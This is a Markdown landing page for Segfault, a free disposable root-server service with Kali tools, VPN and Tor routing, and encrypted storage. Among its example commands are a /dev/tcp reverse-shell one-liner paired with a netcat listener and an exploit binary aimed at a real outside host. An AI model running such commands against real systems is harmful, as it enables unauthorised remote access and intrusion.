---
layout: default
title: Segfault
description: Disposable Root Servers.
---

<!-- <div style="width:80%; margin:auto">
</div> -->

## Log in

```shell
ssh root@segfault.net # The password is 'segfault'
```
{:refdef: style="text-align: center;"}
NEW: Start a [Remote Desktop](https://shell.segfault.net) inside your Browser.
{: refdef}

{:refdef: style="text-align: center;"}
![login screen](sf-login.png){:height="80%" width="80%"}
{: refdef}

## What it does

__Segfault__ offers free unlimited Root Servers. A new server (inside a Virtual Machine) is created for every SSH connection.

* Dedicated `Root Server` for every user.
* Pre-installed tools on Kali-Linux.
* Outgoing traffic is routed through NordVPN/CryptoStorm/Mullvad.
* Reverse TCP/UDP port on a public IP.
* Transparent TOR to connect to `.onion` addresses.
* Log in via `.onion`, `.gsocket` or direct `ssh` (port 22 or 443).
* Encrypted DNS traffic (DNS over HTTPS).
* Pre-configured `.onion` web server. Just put your files in /onion.
* Encrypted storage in `/sec` and `/home` with your password. 
* Encrypted storage is only accessible while you are logged in. Keys are wiped on log out.
* Only the user can decrypt the data. We do not have the key.
* No Logs.

## Show me!

The servers are a great place to compile *stuff* and to test *stuff*.

**Install any app you like:**

```shell
apt install nmap && nmap -thc
```

**Work the Internet**

```shell
ping 1.1.1.1
curl ipinfo.io | jq
ssh blah@anotherserver.com
./7350-sshx3-expl openbsd.org
```

**Publish your webpage on the Darknet:**

```shell
# Share files anonymously:
echo "My First File Shared on The Onion Router (TOR) network" >/onion/helloworld.txt

# Or publish a full webpage (using Markdown syntax):
# Edit your webpage in /sec/www/content/*.md and then publish them:
cd /sec/www && make html
```

**Start Firefox or a Remote Desktop X11/GUI:**

```shell
startxvnc
```

**Work the DarkNet:**

```shell
w3m http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/
ssh root@ta6kb6vqm3vd7vlgvf7k4nbhfzst2yfy52t6dqzmz2plteewn7ynmtad.onion
```

**Connect to IRCNet:**

```shell
su user -c "irssi -c ircnet -n MyNickName"
```

**We allow port forwarding and proxies:**

```shell
ssh -D 127.0.0.1:1080 root@segfault.net
# then from another Terminal on your workstation:
curl -x socks5h://0 ipinfo.io
curl -x socks5h://0 http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/ 
```
<!-- Windows does not like -D 1080 and needs 127.0.0.1:1080 (and does not like 127.1:1080 either) -->

**Connect to your own public PORT:**

```shell
# On your server:
nc -vnlp 34868 # Find your IP & PORT during first log in.

# On another server start a connect back reverse shell to your IP & PORT:
setsid bash -i &>/dev/tcp/185.117.118.23/34868 0>&1 &
```

## How it works

Read the [FAQ](faq) and join us on [Telegram](https://t.me/thcorg) or read the source on [GitHub](https://github.com/hackerschoice/segfault).

This is a **free service** and there are [some restrictions](free) in place. You may want to [upgrade your server](upgrade) and go unrestricted.

## Similar Services

- [SDF Public Access Unix](http://sdf.org/)
- [WindowsOnFly](https://app.apponfly.com/trial)
- [OnWorks](https://www.onworks.net/os-distributions/debian-based/free-kali-linux-online)
- [FreeShell](https://freeshell.de/)
- [Oracle Cloud Free Tier](https://www.oracle.com/uk/cloud/free/)
- [Play With Docker](https://www.docker.com/play-with-docker/)
- [Trash.net](https://www.trash.net/)
- [Tilde.club](http://tilde.club/)
- [and many others...](https://free-for.dev/)

## Love Research. Hate Abuse.

We do not tolerate abuse. Contact us on [Telegram](https://t.me/thcorg) or email root at thc.org if you have any concerns.

## Contact

{% include contact-details.md %}
